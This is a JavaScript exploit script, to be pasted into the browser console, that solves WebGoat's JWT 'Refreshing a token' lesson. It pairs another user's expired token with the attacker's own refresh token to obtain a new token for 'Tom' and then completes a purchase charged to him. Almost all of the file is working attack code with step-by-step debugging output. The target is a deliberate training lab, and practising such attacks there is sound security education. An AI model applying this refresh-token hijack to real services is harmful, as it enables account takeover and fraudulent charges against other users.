// ===================================================================
// JWT REFRESH TOKEN ATTACK - NO SPECIAL CHARACTERS VERSION
// This version will NOT cause "illegal character" errors
// ===================================================================

// ===================================================================
// COMPLETE ONE-SCRIPT SOLUTION
// Copy everything below and paste in Console (F12)
// ===================================================================

(async function() {
    
    console.log('===================================================================');
    console.log('JWT REFRESH TOKEN ATTACK - STARTING');
    console.log('===================================================================');
    
    // Tom's expired token from the log
    const TOMS_EXPIRED_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
    
    // Check if refresh token is set
    console.log('\n[STEP 1] Checking for refresh token...');
    
    if (typeof window.myRefreshToken === 'undefined' || !window.myRefreshToken) {
        console.error('ERROR: window.myRefreshToken is not set!');
        console.log('\nYou need to set your refresh token first:');
        console.log('  window.myRefreshToken = "YOUR_ACTUAL_REFRESH_TOKEN";');
        console.log('\nTo find it:');
        console.log('1. Click buttons on the lesson page');
        console.log('2. Check Network tab (F12 -> Network)');
        console.log('3. Look for refresh_token in responses');
        console.log('4. Copy the value');
        console.log('5. Set: window.myRefreshToken = "paste_here";');
        console.log('6. Re-run this script');
        return;
    }
    
    const MY_REFRESH_TOKEN = window.myRefreshToken;
    
    console.log('SUCCESS: Refresh token found!');
    console.log('Token length:', MY_REFRESH_TOKEN.length);
    console.log('Token preview:', MY_REFRESH_TOKEN.substring(0, 40) + '...');
    
    // Decode Tom's token
    console.log('\n[STEP 2] Decoding Tom\'s expired token...');
    try {
        const tomPayload = JSON.parse(atob(TOMS_EXPIRED_TOKEN.split('.')[1]));
        console.log('Tom\'s token payload:', tomPayload);
        console.log('User:', tomPayload.user);
        console.log('Status: EXPIRED (but cryptographically valid)');
    } catch (e) {
        console.error('Failed to decode Tom\'s token:', e);
    }
    
    // THE ATTACK - Request new token for Tom using YOUR refresh token
    console.log('\n[STEP 3] EXECUTING REFRESH TOKEN MANIPULATION ATTACK...');
    console.log('This is the vulnerability:');
    console.log('- Sending Tom\'s EXPIRED token in Authorization header');
    console.log('- Sending YOUR refresh token in request body');
    console.log('- Server should return NEW token for Tom!');
    
    console.log('\n[STEP 3a] Making fetch request to /WebGoat/JWT/refresh/newToken...');
    
    try {
        const refreshResp = await fetch('/WebGoat/JWT/refresh/newToken', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer ' + TOMS_EXPIRED_TOKEN,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                refresh_token: MY_REFRESH_TOKEN
            })
        });
        
        console.log('[STEP 3b] Response received:');
        console.log('  Status:', refreshResp.status, refreshResp.statusText);
        console.log('  OK:', refreshResp.ok);
        
        if (!refreshResp.ok) {
            console.error('ERROR: Refresh request failed!');
            console.log('HTTP Status:', refreshResp.status);
            
            const responseText = await refreshResp.text();
            console.log('Response:', responseText);
            
            if (refreshResp.status === 401) {
                console.log('\n401 Unauthorized - Your refresh token might be:');
                console.log('1. Expired - Get a fresh one from the lesson page');
                console.log('2. Invalid format - Check if it was copied correctly');
                console.log('3. Not belonging to this session');
                console.log('\nDEBUGGING:');
                console.log('Current refresh token:', MY_REFRESH_TOKEN);
                console.log('Token length:', MY_REFRESH_TOKEN.length);
                console.log('First 20 chars:', MY_REFRESH_TOKEN.substring(0, 20));
                console.log('\nTry this:');
                console.log('1. Go to lesson page');
                console.log('2. Look for a Login or Get Token button');
                console.log('3. Click it');
                console.log('4. Open Network tab');
                console.log('5. Find the response with refresh_token');
                console.log('6. Copy the NEW refresh_token value');
                console.log('7. Set: window.myRefreshToken = "new_value";');
                console.log('8. Re-run this script');
            }
            
            return;
        }
        
        console.log('[STEP 3c] Parsing JSON response...');
        const refreshData = await refreshResp.json();
        console.log('Response data:', refreshData);
        
        if (!refreshData.access_token) {
            console.error('ERROR: No access_token in response!');
            console.log('Response:', refreshData);
            return;
        }
        
        const tomsNewToken = refreshData.access_token;
        
        console.log('\n===================================================================');
        console.log('SUCCESS! Got Tom\'s NEW token!');
        console.log('===================================================================');
        console.log('New token:', tomsNewToken);
        
        // Decode and verify
        console.log('\n[STEP 3d] Verifying new token...');
        try {
            const decoded = JSON.parse(atob(tomsNewToken.split('.')[1]));
            console.log('New token payload:', decoded);
            console.log('User in new token:', decoded.user);
            
            if (decoded.user === 'Tom') {
                console.log('\nSUCCESS! Token has user=Tom!');
                console.log('The refresh token manipulation attack worked!');
            } else {
                console.log('\nWARNING: Token has user=' + decoded.user + ' (expected Tom)');
                console.log('The attack may not have worked as expected.');
            }
        } catch (e) {
            console.error('Failed to decode new token:', e);
        }
        
        // CHECKOUT AS TOM
        console.log('\n[STEP 4] CHECKING OUT AS TOM...');
        console.log('Sending checkout request with Tom\'s new token...');
        
        const checkoutResp = await fetch('/WebGoat/JWT/refresh/checkout', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer ' + tomsNewToken,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest'
            }
        });
        
        console.log('[STEP 4a] Checkout response:');
        console.log('  Status:', checkoutResp.status, checkoutResp.statusText);
        
        const checkoutData = await checkoutResp.json();
        console.log('\nCheckout response data:');
        console.log(checkoutData);
        
        if (checkoutData.lessonCompleted === true) {
            console.log('\n===================================================================');
            console.log('SUCCESS! TOM PAID FOR THE BOOKS!');
            console.log('===================================================================');
            console.log('Challenge: COMPLETE');
            console.log('Tom\'s wallet: -$31.53');
            console.log('Your wallet: Saved!');
            console.log('Lesson: PWNED');
        } else {
            console.log('\nWARNING: Lesson not marked as complete');
            console.log('Feedback:', checkoutData.feedback);
            
            if (checkoutData.feedback && checkoutData.feedback.includes('Jerry')) {
                console.log('\nERROR: Token still has user=Jerry');
                console.log('The refresh token manipulation did not work.');
            }
        }
        
        // Save for manual testing
        window.tomsNewToken = tomsNewToken;
        console.log('\nToken saved to: window.tomsNewToken');
        
    } catch (error) {
        console.log('\n===================================================================');
        console.log('SCRIPT ERROR!');
        console.log('===================================================================');
        console.error('Error:', error);
        console.log('Error message:', error.message);
        console.log('\nDebugging tips:');
        console.log('1. Make sure you are on: http://192.168.254.112:8001/WebGoat/JWT');
        console.log('2. Make sure you are on the "Refreshing a token" lesson');
        console.log('3. Check Network tab for actual HTTP errors');
        console.log('4. Try getting a fresh refresh token');
    }
    
    console.log('\n===================================================================');
    console.log('Script execution completed');
    console.log('===================================================================');
    
})();
